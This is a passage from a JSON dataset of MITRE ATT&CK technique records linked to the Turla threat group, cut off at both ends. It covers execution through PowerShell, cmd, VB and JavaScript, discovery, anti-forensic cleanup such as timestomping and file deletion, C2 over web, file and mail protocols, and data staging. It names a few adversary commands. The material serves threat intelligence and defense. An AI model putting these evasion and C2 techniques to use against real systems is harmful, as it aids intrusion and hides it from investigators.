        "url": "https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1",
        "description": "Microsoft. (2020, August 21). Running Remote Commands. Retrieved July 26, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
    "platform": "windows",
    "tid": "T1059.001",
    "technique": "PowerShell",
    "tactic": "execution",
    "datasources": "command-execution|module-load|process-creation|process-metadata|script-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|mosquito|powerstallion",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
    "technique_references": [
      {
        "source_name": "Microsoft PSfromCsharp APR 2014",
        "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
        "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "SilentBreak Offensive PS Dec 2015",
        "url": "https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
        "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye PowerShell Logging 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html",
        "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Github PSAttack",
        "url": "https://github.com/jaredhaight/PSAttack",
        "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "inv_ps_attacks",
        "url": "https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/",
        "description": "Hastings, M. (2014, July 16). Investigating PowerShell Attacks. Retrieved December 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet PowerShell",
        "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx",
        "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Sixdub PowerPick Jan 2016",
        "url": "http://www.sixdub.net/?p=367",
        "description": "Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
    "platform": "windows",
    "tid": "T1059.003",
    "technique": "Windows Command Shell",
    "tactic": "execution",
    "datasources": "command-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|kazuar|lightneuron|mosquito|tinyturla",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
    "technique_references": [
      {
        "source_name": "SSH in Windows",
        "url": "https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh",
        "description": "Microsoft. (2020, May 19). Tutorial: SSH in Windows Terminal. Retrieved July 26, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
    "platform": "windows|macos|linux",
    "tid": "T1059.005",
    "technique": "Visual Basic",
    "tactic": "execution",
    "datasources": "command-execution|module-load|process-creation|script-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
    "technique_references": [
      {
        "source_name": "VB .NET Mar 2020",
        "url": "https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/",
        "description": ".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "VB Microsoft",
        "url": "https://docs.microsoft.com/dotnet/visual-basic/",
        "description": "Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft VBA",
        "url": "https://docs.microsoft.com/office/vba/api/overview/",
        "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia VBA",
        "url": "https://en.wikipedia.org/wiki/Visual_Basic_for_Applications",
        "description": "Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft VBScript",
        "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
        "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Default VBS macros Blocking ",
        "url": "https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805",
        "description": "Kellie Eickmeyer. (2022, February 7). Helping users stay safe: Blocking internet macros by default in Office. Retrieved February 7, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
    "platform": "windows|macos|linux",
    "tid": "T1059.007",
    "technique": "JavaScript",
    "tactic": "execution",
    "datasources": "command-execution|module-load|process-creation|script-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
    "technique_references": [
      {
        "source_name": "NodeJS",
        "url": "https://nodejs.org/",
        "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "JScrip May 2018",
        "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript",
        "description": "Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft JScript 2007",
        "url": "https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript",
        "description": "Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript …. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Windows Scripts",
        "url": "https://docs.microsoft.com/scripting/winscript/windows-script-interfaces",
        "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple About Mac Scripting 2016",
        "url": "https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html",
        "description": "Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "SpecterOps JXA 2020",
        "url": "https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5",
        "description": "Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "SentinelOne macOS Red Team",
        "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/",
        "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary Silver Sparrow Feb2021",
        "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/",
        "description": "Tony Lambert. (2021, February 18). Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "MDSec macOS JXA and VSCode",
        "url": "https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/",
        "description": "Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace|containers",
    "tid": "T1069",
    "technique": "Permission Groups Discovery",
    "tactic": "discovery",
    "datasources": "application-log-content|command-execution|group-enumeration|group-metadata|pod-metadata|process-creation",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1069.001",
      "T1069.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/576.html",
        "description": "none",
        "external_id": "CAPEC-576"
      },
      {
        "source_name": "K8s Authorization Overview",
        "url": "https://kubernetes.io/docs/reference/access-authn-authz/authorization/",
        "description": "Kubernetes. (n.d.). Authorization Overview. Retrieved June 24, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b",
    "platform": "linux|macos|windows",
    "tid": "T1069.001",
    "technique": "Local Groups",
    "tactic": "discovery",
    "datasources": "command-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|kazuar",
    "correlation_tool": "net",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
    "technique_references": [],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c",
    "platform": "linux|macos|windows",
    "tid": "T1070.004",
    "technique": "File Deletion",
    "tactic": "defense-evasion",
    "datasources": "command-execution|file-deletion",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|gazer|kazuar|lightneuron|mosquito|penquin",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
    "technique_references": [
      {
        "source_name": "Microsoft SDelete July 2016",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete",
        "description": "Russinovich, M. (2016, July 4). SDelete v2.0. Retrieved February 8, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c",
    "platform": "windows",
    "tid": "T1070.005",
    "technique": "Network Share Connection Removal",
    "tactic": "defense-evasion",
    "datasources": "command-execution|network-traffic-content|process-creation|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "net",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)",
    "technique_references": [
      {
        "source_name": "Technet Net Use",
        "url": "https://technet.microsoft.com/bb490717.aspx",
        "description": "Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611",
    "platform": "linux|macos|windows",
    "tid": "T1070.006",
    "technique": "Timestomp",
    "tactic": "defense-evasion",
    "datasources": "file-metadata|file-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer|powerstallion",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",
    "technique_references": [
      {
        "source_name": "WindowsIR Anti-Forensic Techniques",
        "url": "http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html",
        "description": "Carvey, H. (2013, July 23). HowTo: Determine/Detect the use of Anti-Forensics Techniques. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "root|system|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
    "platform": "linux|macos|windows",
    "tid": "T1071.001",
    "technique": "Web Protocols",
    "tactic": "command-and-control",
    "datasources": "network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|crutch|epic|gazer|kazuar|tinyturla",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b",
    "platform": "linux|macos|windows",
    "tid": "T1071.002",
    "technique": "File Transfer Protocols",
    "tactic": "command-and-control",
    "datasources": "network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "kazuar",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b",
    "platform": "linux|macos|windows",
    "tid": "T1071.003",
    "technique": "Mail Protocols",
    "tactic": "command-and-control",
    "datasources": "network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|lightneuron",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
    "platform": "linux|macos|windows",
    "tid": "T1074.001",
    "technique": "Local Data Staging",
    "tactic": "collection",
    "datasources": "command-execution|file-access|file-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|crutch|kazuar|lightneuron",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
    "technique_references": [
      {
        "source_name": "Prevailion DarkWatchman 2021",
        "url": "https://www.prevailion.com/darkwatchman-new-fileless-techniques/",
        "description": "Smith, S., Stafford, M. (2021, December 14). DarkWatchman: A new evolution in fileless techniques. Retrieved January 10, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace|containers",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "defense-evasion",
    "datasources": "logon-session-creation|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "hyperstack",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AWS Root User",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html",
        "description": "Amazon. (n.d.). AWS Account Root User. Retrieved April 5, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Threat Matrix for Kubernetes",
        "url": "https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/",
        "description": "Weizman, Y. (2020, April 2). Threat Matrix for Kubernetes. Retrieved March 30, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace|containers",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "initial-access",
    "datasources": "logon-session-creation|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "hyperstack",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AWS Root User",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html",
        "description": "Amazon. (n.d.). AWS Account Root User. Retrieved April 5, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Threat Matrix for Kubernetes",
